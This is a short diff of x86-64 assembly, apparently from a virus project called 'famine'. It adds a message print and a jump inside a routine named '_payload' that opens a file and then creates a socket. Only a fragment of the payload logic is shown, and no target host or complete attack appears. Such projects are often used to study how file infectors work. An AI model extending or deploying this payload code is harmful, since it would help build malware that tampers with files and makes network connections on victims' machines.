@@ -28,6 +28,13 @@ section .text
 
 _payload:
 	pushx rax, rdi, rsi, rdx, r10
+
+	; sys_write
+	mov rax, 1
+	mov	rdi, rax
+	lea	rsi, [rel .msg]
+	mov	rdx, 7
+	syscall
 	
 	; Open the file
 	mov rax, 2					; syscall number for open
@@ -45,6 +52,10 @@ _payload:
 	syscall
 	cmp rax, -1
 	je .clean
+
+	jmp .connect
+
+.msg	db "famine", 0x0a, 0
 
 .connect:
 	; Create the socket
